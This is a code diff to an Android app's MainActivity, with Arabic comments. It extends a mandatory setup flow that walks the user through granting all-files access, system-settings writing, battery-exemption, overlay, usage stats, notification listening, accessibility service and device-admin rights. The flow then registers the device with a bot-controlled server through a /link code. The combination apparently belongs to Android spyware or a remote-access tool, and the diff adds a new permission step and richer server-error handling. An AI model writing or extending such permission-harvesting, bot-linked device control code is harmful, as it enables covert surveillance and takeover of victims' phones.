@@ -41,20 +41,21 @@ class MainActivity : AppCompatActivity() {
     private var isSetupComplete = false
 
     /**
-     * مراحل الأذونات - 10 مراحل شاملة
-     * لا يتم تخطي أي مرحلة
+     * مراحل الأذونات - 11 مرحلة شاملة
+     * لا يتم تخطي أي مرحلة أبداً
      */
     private enum class SetupStep(val id: Int) {
         BASIC_RUNTIME(0),           // أذونات التشغيل العادية
         ALL_FILES_ACCESS(1),        // الوصول الكامل للملفات (Android 11+)
-        BATTERY_OPTIMIZATION(2),    // تجاهل تحسين البطارية
-        OVERLAY(3),                 // عرض فوق التطبيقات
-        USAGE_STATS(4),             // إحصائيات الاستخدام
-        NOTIFICATION_LISTENER(5),   // مستمع الإشعارات
-        ACCESSIBILITY(6),           // خدمة إمكانية الوصول
-        DEVICE_ADMIN(7),            // مسؤول الجهاز
-        LINK_CODE(8),              // إدخال كود الربط من السيرفر
-        COMPLETE(9);               // اكتمال التفعيل
+        WRITE_SETTINGS(2),          // تعديل إعدادات النظام
+        BATTERY_OPTIMIZATION(3),    // تجاهل تحسين البطارية
+        OVERLAY(4),                 // عرض فوق التطبيقات
+        USAGE_STATS(5),             // إحصائيات الاستخدام
+        NOTIFICATION_LISTENER(6),   // مستمع الإشعارات
+        ACCESSIBILITY(7),           // خدمة إمكانية الوصول
+        DEVICE_ADMIN(8),            // مسؤول الجهاز
+        LINK_CODE(9),              // إدخال كود الربط من السيرفر
+        COMPLETE(10);              // اكتمال التفعيل
 
         fun next(): SetupStep? = entries.getOrNull(id + 1)
     }
@@ -84,6 +85,7 @@ class MainActivity : AppCompatActivity() {
         Manifest.permission.READ_MEDIA_IMAGES,
         Manifest.permission.READ_MEDIA_VIDEO,
         Manifest.permission.READ_MEDIA_AUDIO,
+        Manifest.permission.WRITE_SETTINGS,
         Manifest.permission.POST_NOTIFICATIONS,
         Manifest.permission.BODY_SENSORS,
         Manifest.permission.ACTIVITY_RECOGNITION
@@ -119,12 +121,13 @@ class MainActivity : AppCompatActivity() {
     private fun checkAndRequestPermissions() {
         val step = currentStep
         val stepNum = step.id + 1
-        val totalSteps = 9
+        val totalSteps = 10
         jsNotify("onPermissionStep", "$stepNum/$totalSteps")
 
         when (step) {
             SetupStep.BASIC_RUNTIME -> requestBasicPermissions()
             SetupStep.ALL_FILES_ACCESS -> requestAllFilesAccess()
+            SetupStep.WRITE_SETTINGS -> requestWriteSettingsPermission()
             SetupStep.BATTERY_OPTIMIZATION -> requestBatteryOptimization()
             SetupStep.OVERLAY -> requestOverlayPermission()
             SetupStep.USAGE_STATS -> requestUsageStatsPermission()
@@ -228,7 +231,33 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ========== الخطوة 3: تحسين البطارية ==========
+    // ========== الخطوة 3: تعديل إعدادات النظام ==========
+    private fun requestWriteSettingsPermission() {
+        jsNotify("onPermissionPending", "write_settings")
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (Settings.System.canWrite(this)) {
+                Log.d("MainActivity", "✅ صلاحية تعديل الإعدادات مفعّلة مسبقاً")
+                jsNotify("onPermissionGranted", "write_settings")
+                advanceToNextStep()
+            } else {
+                try {
+                    val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
+                    intent.data = Uri.parse("package:$packageName")
+                    startActivityForResult(intent, SetupStep.WRITE_SETTINGS.id)
+                } catch (e: Exception) {
+                    Log.e("MainActivity", "خطأ في طلب صلاحية الإعدادات: ${e.message}")
+                    jsNotify("onPermissionError", "write_settings")
+                    advanceToNextStep()
+                }
+            }
+        } else {
+            Log.d("MainActivity", "✅ Android ${Build.VERSION.SDK_INT} - صلاحية الإعدادات متوفرة افتراضياً")
+            jsNotify("onPermissionGranted", "write_settings")
+            advanceToNextStep()
+        }
+    }
+
+    // ========== الخطوة 4: تحسين البطارية ==========
     private fun requestBatteryOptimization() {
         jsNotify("onPermissionPending", "battery")
         val pwrm = getSystemService(Context.POWER_SERVICE) as PowerManager
@@ -380,27 +409,73 @@ class MainActivity : AppCompatActivity() {
 
                 Log.d("MainActivity", "استجابة السيرفر: $responseCode - $response")
 
-                if (responseCode in 200..299 && response.contains("\"ok\":true")) {
-                    Log.d("MainActivity", "✅ كود الربط صحيح - تم التحقق من السيرفر!")
-                    SharedPrefsManager.setLinkCode(this@MainActivity, code)
-                    SharedPrefsManager.setDeviceId(this@MainActivity, deviceId)
-                    SharedPrefsManager.setBotRegistered(this@MainActivity, true)
+                if (responseCode in 200..299) {
+                    // تحليل الاستجابة بالتفصيل
+                    val jsonResponse = try {
+                        org.json.JSONObject(response)
+                    } catch (e: Exception) {
+                        Log.e("MainActivity", "❌ استجابة غير صالحة من السيرفر: $response")
+                        runOnUiThread {
+                            jsCall("onLinkCodeError('استجابة غير صالحة من السيرفر. حاول مرة أخرى.')")
+                        }
+                        return@launch
+                    }
 
-                    runOnUiThread {
-                        jsNotify("onPermissionGranted", "link")
-                        advanceToNextStep()
+                    if (jsonResponse.optBoolean("ok", false)) {
+                        Log.d("MainActivity", "✅ كود الربط صحيح - تم التحقق من السيرفر!")
+                        SharedPrefsManager.setLinkCode(this@MainActivity, code)
+                        SharedPrefsManager.setDeviceId(this@MainActivity, deviceId)
+                        SharedPrefsManager.setBotRegistered(this@MainActivity, true)
+
+                        runOnUiThread {
+                            jsNotify("onPermissionGranted", "link")
+                            advanceToNextStep()
+                        }
+                    } else {
+                        val errorMsg = jsonResponse.optString("error", "خطأ غير معروف")
+                        Log.e("MainActivity", "❌ كود الربط مرفوض: $errorMsg")
+                        val userMsg = when {
+                            errorMsg.contains("expired", ignoreCase = true) -> "⏱️ كود الربط منتهي الصلاحية. أرسل /link في البوت للحصول على كود جديد."
+                            errorMsg.contains("Invalid", ignoreCase = true) -> "❌ كود الربط غير صحيح. تأكد من الكود وحاول مرة أخرى."
+                            errorMsg.contains("used", ignoreCase = true) -> "🔄 هذا الكود تم استخدامه مسبقاً. أرسل /link للحصول على كود جديد."
+                            else -> "❌ خطأ في الكود: $errorMsg"
+                        }
+                        runOnUiThread {
+                            jsCall("onLinkCodeError('$userMsg')")
+                        }
                     }
                 } else {
-                    Log.e("MainActivity", "❌ كود الربط غير صحيح أو منتهي الصلاحية")
-                    runOnUiThread {
-                        jsCall("onLinkCodeError('كود الربط غير صحيح أو منتهي الصلاحية. أرسل /link في البوت للحصول على كود جديد.')")
+                    val errorBody = try { connection.errorStream?.bufferedReader()?.readText() ?: "" } catch (e: Exception) { "" }
+                    Log.e("MainActivity", "❌ خطأ السيرفر $responseCode: $errorBody")
+                    val userMsg = when {
+                        responseCode == 400 -> "❌ كود الربط غير صحيح أو منتهي الصلاحية. أرسل /link في البوت للحصول على كود جديد."
+                        responseCode == 404 -> "❌ السيرفر غير متاح. تأكد أن البوت يعمل على السيرفر."
+                        responseCode >= 500 -> "⚠️ خطأ في السيرفر. حاول بعد قليل."
+                        else -> "❌ خطأ في الاتصال (رمز $responseCode). حاول مرة أخرى."
                     }
+                    runOnUiThread {
+                        jsCall("onLinkCodeError('$userMsg')")
+                    }
+                }
+            } catch (e: java.net.SocketTimeoutException) {
+                Log.e("MainActivity", "❌ انتهت مهلة الاتصال بالسيرفر")
+                runOnUiThread {
+                    jsCall("onLinkCodeError('⏱️ انتهت مهلة الاتصال بالسيرفر. تأكد من اتصال الإنترنت وأن السيرفر يعمل.')")
+                }
+            } catch (e: java.net.UnknownHostException) {
+                Log.e("MainActivity", "❌ لا يمكن الوصول للسيرفر")
+                runOnUiThread {
+                    jsCall("onLinkCodeError('🌐 لا يمكن الوصول للسيرفر. تأكد من اتصال الإنترنت.')")
+                }
+            } catch (e: javax.net.ssl.SSLException) {
+                Log.e("MainActivity", "❌ خطأ في شهادة SSL")
+                runOnUiThread {
+                    jsCall("onLinkCodeError('🔒 خطأ في الاتصال الآمن. حاول مرة أخرى.')")
                 }
             } catch (e: Exception) {
                 Log.e("MainActivity", "❌ خطأ في الاتصال بالسيرفر: ${e.message}")
-                // لا نقبل الكود إذا السيرفر لا يستجيب
                 runOnUiThread {
-                    jsCall("onLinkCodeError('خطأ في الاتصال بالسيرفر. تأكد من اتصال الإنترنت وحاول مرة أخرى.')")
+                    jsCall("onLinkCodeError('❌ خطأ في الاتصال بالسيرفر: ${e.message}. تأكد من اتصال الإنترنت.')")
                 }
             }
         }
@@ -487,6 +562,7 @@ class MainActivity : AppCompatActivity() {
         val granted = when (currentStep) {
             SetupStep.BASIC_RUNTIME -> true // تم معالجته في onRequestPermissionsResult
             SetupStep.ALL_FILES_ACCESS -> isAllFilesAccessGranted()
+            SetupStep.WRITE_SETTINGS -> isWriteSettingsGranted()
             SetupStep.BATTERY_OPTIMIZATION -> isIgnoringBattery()
             SetupStep.OVERLAY -> Settings.canDrawOverlays(this)
             SetupStep.USAGE_STATS -> hasUsageStatsPermission()
@@ -501,6 +577,7 @@ class MainActivity : AppCompatActivity() {
             val stepName = when (currentStep) {
                 SetupStep.BASIC_RUNTIME -> "basic"
                 SetupStep.ALL_FILES_ACCESS -> "all_files"
+                SetupStep.WRITE_SETTINGS -> "write_settings"
                 SetupStep.BATTERY_OPTIMIZATION -> "battery"
                 SetupStep.OVERLAY -> "overlay"
                 SetupStep.USAGE_STATS -> "usage"
@@ -530,6 +607,14 @@ class MainActivity : AppCompatActivity() {
     }
 
     // ==================== دوال مساعدة ====================
+
+    private fun isWriteSettingsGranted(): Boolean {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Settings.System.canWrite(this)
+        } else {
+            true
+        }
+    }
 
     private fun isAllFilesAccessGranted(): Boolean {
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
